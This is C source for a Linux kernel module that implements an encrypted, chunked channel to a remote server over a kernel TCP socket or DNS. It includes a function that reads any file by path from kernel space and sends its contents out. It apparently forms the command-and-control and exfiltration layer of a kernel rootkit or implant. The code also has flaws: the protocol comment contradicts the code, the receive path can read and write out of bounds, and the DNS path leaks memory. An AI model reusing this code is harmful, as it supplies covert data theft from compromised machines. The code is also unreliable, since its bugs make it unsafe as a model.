#include "network.h"

/*
 * Custom communication protocol:
 * Each message is divided into fixed-size chunks (STD_BUFFER_SIZE).
 * Each chunk contains:
 * - [0] : total number of chunks to be received,
 * - [1] : chunk index (order of sending),
 * - [2-3] : length of the useful content (2 bytes, big-endian),
 * - [4-N] : encrypted chunk data,
 * - [last byte] : end-of-transmission indicator (EOT_CODE).
 * Messages are encrypted before sending and decrypted upon reception.
 * Chunks are reassembled on the server side according to their index.
 */

#define EOT_CODE 0x04     // End of transmission code
#define CHUNK_OVERHEAD 11 // Header size per chunk

// Utility to check if all chunks were received
static inline bool all_chunks_received(bool *received, size_t count) {
    for (size_t i = 0; i < count; ++i)
        if (!received[i])
            return false;
    return true;
}

// Formats a string with variable arguments and returns a dynamically allocated buffer
static char *vformat_string(const char *fmt, va_list ap) {
    va_list args_copy;
    char *formatted;
    int needed;

    va_copy(args_copy, ap);
    needed = vsnprintf(NULL, 0, fmt, ap);
    if (needed < 0) {
        va_end(args_copy);
        return NULL;
    }

    formatted = kzalloc(needed + 1, GFP_KERNEL);
    if (!formatted) {
        va_end(args_copy);
        return NULL;
    }

    vsnprintf(formatted, needed + 1, fmt, args_copy);
    va_end(args_copy);
    return formatted;
}

// Formats and sends a message to the server
int send_to_server(enum Protocol protocol, char *message, ...) {
    if (protocol == TCP && !get_worker_socket()) {
        ERR_MSG("send_to_server: socket is not initialized\n");
        return -EINVAL;
    }

    // Check if there is only one parameter (the string itself)
    va_list args;
    va_start(args, message);
    if (va_arg(args, char *) == NULL) {
        va_end(args);

        // It protocol is DNS, send the message directly
        if (protocol == DNS)
            return dns_send_data(message, strlen(message));

        // If protocol is TCP, send the raw message
        return send_to_server_raw(message, strlen(message));
    }
    va_end(args);

    va_start(args, message);

    // If there are more parameters, format the message
    char *formatted_message = vformat_string(message, args);
    va_end(args);

    if (!formatted_message) {
        ERR_MSG("send_to_server: failed to format message\n");
        return -ENOMEM;
    }

    // If the protocol is DNS, send the formatted message over DNS
    if (protocol == DNS)
        return dns_send_data(formatted_message, strlen(formatted_message));

    // Send the formatted message through TCP
    int ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));

    // Free the formatted message buffer
    kfree(formatted_message);
    return ret_code;
}

// Sends encrypted data to the server using the chunked protocol
int send_to_server_raw(const char *data, size_t len) {
    struct socket *sock = get_worker_socket();
    if (!sock)
        return -EINVAL;

    char *encrypted_msg = NULL;
    size_t encrypted_len = 0;

    // Encrypt the data before sending
    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0)
        return -EIO;

    size_t max_chunk_body = STD_BUFFER_SIZE - CHUNK_OVERHEAD;
    size_t nb_chunks = DIV_ROUND_UP(encrypted_len, max_chunk_body);

    // Send each chunk individually
    for (size_t i = 0; i < nb_chunks; ++i) {
        size_t chunk_len = (i == nb_chunks - 1) ? (encrypted_len - i * max_chunk_body) : max_chunk_body;

        char *chunk = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
        if (!chunk) {
            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
            vfree(encrypted_msg);
            return -ENOMEM;
        }

        // total_chunks in big-endian 32 bits
        uint32_t tc = (uint32_t)nb_chunks;
        chunk[0] = (uint8_t)((tc >> 24) & 0xFF);
        chunk[1] = (uint8_t)((tc >> 16) & 0xFF);
        chunk[2] = (uint8_t)((tc >> 8) & 0xFF);
        chunk[3] = (uint8_t)((tc >> 0) & 0xFF);

        // chunk_index in big-endian 32 bits
        uint32_t ci = (uint32_t)i;
        chunk[4] = (uint8_t)((ci >> 24) & 0xFF);
        chunk[5] = (uint8_t)((ci >> 16) & 0xFF);
        chunk[6] = (uint8_t)((ci >> 8) & 0xFF);
        chunk[7] = (uint8_t)((ci >> 0) & 0xFF);

        // chunk_len in big-endian 16 bits
        uint16_t cl = (uint16_t)chunk_len;
        chunk[8] = (uint8_t)((cl >> 8) & 0xFF);
        chunk[9] = (uint8_t)((cl >> 0) & 0xFF);

        memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);
        chunk[10 + chunk_len] = EOT_CODE; // End of transmission

        // Send the chunk using kernel socket API
        struct kvec vec = { .iov_base = chunk, .iov_len = STD_BUFFER_SIZE };
        struct msghdr msg = { 0 };

        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
        kfree(chunk);
        if (ret < 0) {
            vfree(encrypted_msg);
            return ret;
        }
    }

    vfree(encrypted_msg);
    return 0;
}

// Receives a full message from the server using the chunked protocol
int receive_from_server(char *buffer, size_t max_len) {
    struct socket *sock = get_worker_socket();
    if (!sock)
        return -EINVAL;

    char *received = kzalloc(max_len, GFP_KERNEL);
    if (!received) {
        ERR_MSG("receive_from_server: failed to allocate buffer\n");
        return -ENOMEM;
    }

    bool *received_chunks = NULL;
    size_t total_received = 0;
    size_t nb_chunks = 0;

    while (true) {
        char *chunk = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
        if (!chunk) {
            ERR_MSG("receive_from_server: failed to allocate chunk buffer\n");
            kfree(received);
            return -ENOMEM;
        }

        // Receive a single chunk
        struct kvec vec = { .iov_base = chunk, .iov_len = STD_BUFFER_SIZE };
        struct msghdr msg = { 0 };
        int ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
        if (ret <= 0) {
            kfree(chunk);
            kfree(received);
            return -EIO;
        }

        // Extract header informations (10 octets) in big-endian (ouch)
        uint32_t total = ((uint8_t) chunk[0] << 24) 
            | ((uint8_t) chunk[1] << 16)
            | ((uint8_t) chunk[2] << 8)
            | ((uint8_t) chunk[3]);

        uint32_t index = ((uint8_t)chunk[4] << 24)
            | ((uint8_t) chunk[5] << 16)
            | ((uint8_t) chunk[6] << 8)
            | ((uint8_t) chunk[7]);

        uint16_t data_len = ((uint8_t)chunk[8] << 8)
            | ((uint8_t)chunk[9]);

        // Validate end-of-transmission
         if ((uint8_t)chunk[10 + data_len] != EOT_CODE) {
            kfree(chunk);
            kfree(received);
            return -EINVAL;
        }

        // Initialize tracking array on first valid chunk
        if (!received_chunks) {
            nb_chunks = total;
            received_chunks = kzalloc(nb_chunks * sizeof(bool), GFP_KERNEL);
            if (!received_chunks) {
                kfree(chunk);
                kfree(received);
                return -ENOMEM;
            }
        }

         // Check index
        if (index >= nb_chunks) {
            kfree(chunk);
            kfree(received);
            kfree(received_chunks);
            return -EINVAL;
        }

        // Skip duplicate chunks
        if (received_chunks[index]) {
            kfree(chunk);
            continue;
        }

        size_t max_chunk_body = STD_BUFFER_SIZE - CHUNK_OVERHEAD; // 1013
        if (data_len > max_chunk_body) {
            kfree(chunk);
            kfree(received);
            kfree(received_chunks);
            return -EINVAL;
        }

        // Store chunk data in its proper position
        size_t payload_offset = CHUNK_OVERHEAD - 1;
        memcpy(received + index * (STD_BUFFER_SIZE - CHUNK_OVERHEAD), chunk + payload_offset, data_len);
        received_chunks[index] = true;
        total_received += data_len;

        kfree(chunk);

        // Exit once all chunks are received
        if (all_chunks_received(received_chunks, nb_chunks))
            break;
    }

    kfree(received_chunks);

    char *decrypted = NULL;
    size_t decrypted_len = 0;

    // Decrypt the assembled message
    if (decrypt_buffer(received, total_received, &decrypted, &decrypted_len) < 0) {
        kfree(received);
        return -EIO;
    }

    decrypted_len = min(decrypted_len, max_len - 1);
    memcpy(buffer, decrypted, decrypted_len);
    buffer[decrypted_len] = '\0'; // Null-terminate the result

    kfree(received);
    vfree(decrypted);
    return decrypted_len;
}

// Sends the content of a file to the server using the chunked protocol
int send_file_to_server(char *filename) {
    struct file *file = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(file))
        return PTR_ERR(file);

    loff_t size = i_size_read(file_inode(file));
    if (size <= 0) {
        filp_close(file, NULL);
        return -EINVAL;
    }

    char *buffer = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!buffer) {
        ERR_MSG("send_file_to_server: failed to allocate file buffer\n");
        filp_close(file, NULL);
        return -ENOMEM;
    }

    loff_t pos = 0;
    ssize_t read;
    int ret = 0;

    // Read file in chunks and send them one by one
    while ((read = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
        ret = send_to_server_raw(buffer, read);
        if (ret < 0)
            break;
    }

    kfree(buffer);
    filp_close(file, NULL);
    return ret < 0 ? ret : 0;
}